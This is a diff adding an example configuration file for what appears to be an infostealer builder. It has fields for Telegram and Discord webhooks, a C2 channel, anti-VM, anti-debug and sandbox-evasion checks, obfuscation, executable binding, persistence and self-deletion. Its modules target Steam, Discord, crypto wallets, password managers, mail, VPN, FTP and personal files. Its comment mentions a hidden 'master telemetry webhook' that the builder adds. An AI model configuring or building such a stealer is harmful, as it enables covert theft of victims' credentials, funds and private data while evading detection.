@@ -1,0 +1,24 @@
+{
+  "_comment": "Copy to builder_config.json and fill with YOUR values. This example is GitHub-safe (no real secrets). Your webhook will be obfuscated into the binary, and the master telemetry webhook is added automatically by the builder.",
+  "tg_bot_token": "",
+  "tg_chat_id": "",
+  "webhook_url": "",
+  "discord_webhook": "",
+  "c2_channel_id": "",
+  "build_tag": "ultria",
+  "gui_mode": "none",
+  "bind_exe": "",
+  "obf_level": 1,
+  "target_size_mb": 0,
+  "enable_vm_check": true,
+  "enable_debug_check": true,
+  "enable_sandbox_check": true,
+  "enable_persistence": false,
+  "self_delete": false,
+  "collect_screenshot": true,
+  "modules": {
+    "steam": true, "discord": true, "telegram": true,
+    "wallets": true, "games": true, "messengers": true, "vpn": true,
+    "ftp": true, "mail": true, "pwmanagers": true, "socials": true, "files": true
+  }
+}
